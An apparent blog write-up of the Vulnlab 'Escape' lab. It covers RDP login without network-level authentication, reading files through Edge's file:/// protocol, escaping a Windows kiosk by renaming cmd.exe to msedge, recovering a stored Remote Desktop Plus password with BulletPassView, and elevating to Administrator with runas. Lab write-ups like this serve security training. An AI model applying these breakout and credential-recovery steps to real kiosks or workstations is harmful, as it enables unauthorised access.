<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/escape~10.10.88.71$ xfreerdp <span class="variable">$ip</span></span><br><span class="line">... more above ...</span><br><span class="line">Certificate details <span class="keyword">for</span> 10.10.88.71:3389 (RDP-Server):</span><br><span class="line">        Common Name: Escape</span><br><span class="line">        Subject:     CN = Escape</span><br><span class="line">        Issuer:      CN = Escape</span><br><span class="line">        Thumbprint:  3f:87:66:1a:0e:84:c2:67:34:c4:24:bd:10:d0:c7:1e:f5:a7:8a:2d:09:01:3a:35:41:a4:2c:c5:e7:d0:5e:93</span><br><span class="line">The above X.509 certificate could not be verified, possibly because you <span class="keyword">do</span> not have</span><br><span class="line">the CA certificate <span class="keyword">in</span> your certificate store, or the certificate has expired.</span><br><span class="line">Please look at the OpenSSL documentation on how to add a private CA to the store.</span><br><span class="line">Do you trust the above certificate? (Y/T/N) y</span><br><span class="line">Domain:   Escape.vl</span><br><span class="line">Password:</span><br><span class="line">[20:21:31:990] [269:270] [WARN][com.freerdp.core.nla] - SPNEGO received NTSTATUS: STATUS_LOGON_FAILURE [0xC000006D] from server</span><br><span class="line">[20:21:31:990] [269:270] [ERROR][com.freerdp.core] - nla_recv_pdu:freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE [0x00020014]</span><br><span class="line">[20:21:31:990] [269:270] [ERROR][com.freerdp.core.rdp] - rdp_recv_callback: CONNECTION_STATE_NLA - nla_recv_pdu() fail</span><br><span class="line">[20:21:31:990] [269:270] [ERROR][com.freerdp.core.transport] - transport_check_fds: transport-&gt;ReceiveCallback() - -1</span><br></pre></td></tr></table></figure></div>
<p>The request failed due to missing passwords.</p>
<p>Using <code>-sec-nla</code> from <code>xfreerdp</code>, I can disable the needs to establish remote connection with password.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/escape~10.10.88.71$ xfreerdp <span class="variable">$ip</span> --sec-nla</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/kioskuser0.png"
                      alt="kioskuser0"
                ></p>
<hr>

<h3 id="Kiosk-mode"><a href="#Kiosk-mode" class="headerlink" title="Kiosk mode"></a>Kiosk mode</h3><p>Notice that the screen mention <code>KioskUser0</code>. Using the username, logging in without password is possible. However, due to the device logged in as Kiosk. There’s limited function.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/busan-expo.png"
                      alt="busan-expo"
                ><br><br></p>
<p>Seems like Microsoft Edge is functioning, but no connectivity.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/limited-function.png"
                      alt="limited-function"
                ></p>
<p>Only able to press “windows” key to bring up the Start bar<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/msedge.png"
                      alt="msedge"
                ><em>Powershell</em> &amp; <em>CMD</em> can’t be launched. Same goes to file explorer. The only accessible application is <em>Microsoft Edge</em>.</p>
<hr>

<h3 id="Reading-Files"><a href="#Reading-Files" class="headerlink" title="Reading Files"></a>Reading Files</h3><p>From <em>Edge</em>, try to use the file protocol <code>file:///</code> to access the files<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/reading-files.png"
                      alt="reading-files"
                ><br>Notice there’s a folder named <code>_admin</code> and also <code>Users</code></p>
<p>From the <code>Users</code> directory, navigate into <code>kioskuser0</code> and get user flag<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/user-flag.png"
                      alt="user"
                ></p>
<p>Inside the <code>_admin</code> folder, contains passwords directory and profiles.xml<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/juicy-stuff.png"
                      alt="juicy-stuff"
                ></p>
<p>However, there’s nothing inside the passwords<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/nothing-passwords.png"
                      alt="nothing-password"
                ></p>
<p>Going back to <code>profiles.xml</code>, notice there’s a username with <code>127.0.0.1</code> and password in it<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/xml-rdplus.png"
                      alt="rdplus"
                ><br>Tried to crack the password but doesn’t return anything</p>
<hr>

<h3 id="Command-Prompt"><a href="#Command-Prompt" class="headerlink" title="Command Prompt"></a>Command Prompt</h3><blockquote>
<p>To open up Command Prompt in Kiosk mode, copy the <code>cmd.exe</code> to the <code>kioskuser0</code> directory and rename it to <code>msedge</code> so that it can be activated without restricted.<br>[<a class="link"   href="https://blog.nviso.eu/2022/05/24/breaking-out-of-windows-kiosk-using-only-microsoft-edge]" >https://blog.nviso.eu/2022/05/24/breaking-out-of-windows-kiosk-using-only-microsoft-edge]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<p>Therefore, locate the <code>cmd.exe</code> and download it<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/download-cmd.png"
                      alt="download-cmd"
                ><br><br></p>
<p>Rename the <code>command prompt</code> from <code>cmd --&gt; msedge</code> to bypass the kiosk restriction.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/renaming.png"
                      alt="renaming"
                ><br><br></p>
<p>Double-click the renamed <code>command prompt</code> and it will be executed.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/getting-cmd.png"
                      alt="getting-cmd"
                ></p>
<hr>

<h3 id="BulletPassView"><a href="#BulletPassView" class="headerlink" title="BulletPassView"></a>BulletPassView</h3><p>Import BulletPassView.exe by NirSoft by hosting a server on my Kali machine.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/bpv-curl.png"
                      alt="bpv"
                ><br><br></p>
<p>Run the <code>Remote Desktop Plus</code> via <code>command prompt</code>. Usually located at <code>C:\Program Files (x86)\Remote Desktop Plus</code>.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/running-rdpexe.png"
                      alt="rdplus-run"
                ><br><br></p>
<p>Copy the <code>profiles.xml</code> found just now to <code>kioskuser0/Download</code> using powershell as only <code>Download</code> directory is readable&#x2F;writable.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/copy-profiles.png"
                      alt="copy-profile"
                ><br><br></p>
<p>Import it into <code>rdp.exe</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/rdplus-import.png"
                      alt="rdplus-import"
                ><br><br></p>
<p>Reveal the password in BulletsPassView.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/bpv-reveal.png"
                      alt="bpv-show"
                ><br><br></p>
<p>Use powershell to <code>runas</code> admin with the password<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/as-user-admin.png"
                      alt="user-admin-cmd"
                ><br><br></p>
<h2 id="Administrator"><a href="#Administrator" class="headerlink" title="Administrator"></a>Administrator</h2><p>After gaining user <code>admin</code> powershell, I did some enumeration in his directory and discovered nothing.</p>
<p>Run the user <code>admin</code>‘s powershell with Administrator Privilege and accept the request using <code>Start-Process powershell -Verb Runas</code>.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/administrator-ps.png"
                      alt="administrator-ps"
                ><br><br></p>
<p>With the administrator-privileged powershell, I can access the <code>Administrator</code> directory and pwn the lab.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/root-txt.png"
                      alt="root-txt"
                ><br><br></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-escape/pwn-escape.png"
                      alt="pwn"
                ></p>
]]></content>
      <tags>
        <tag>Vulnlab</tag>
        <tag>Easy</tag>
        <tag>Windows</tag>
        <tag>Kiosk</tag>
      </tags>
  </entry>
</search>
